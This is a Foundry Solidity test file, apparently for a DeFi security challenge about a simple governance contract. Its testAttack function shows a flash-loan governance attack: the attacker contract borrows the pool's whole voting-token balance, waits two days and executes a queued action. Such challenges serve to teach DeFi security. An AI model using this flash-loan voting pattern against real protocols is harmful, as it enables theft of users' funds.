// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/Test.sol";
import {UtilsTest} from "./Utils.t.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SimpleGovernanceTest is UtilsTest {
    function setUp() public override {
        UtilsTest.setUp();
    }

    function testVotesSupply() public view {
        assertEq(dvtVotes.totalSupply(), 1500000 ether);
    }

    function testAttack() public {
        // Activate voting power
        vm.startPrank(address(target));
        pool.flashLoan(
            IERC3156FlashBorrower(target),
            address(dvtVotes),
            dvtVotes.balanceOf(address(pool)),
            ""
        );

        vm.warp(block.timestamp + 2 days);
        target.execute();
        vm.stopPrank();
    }
}
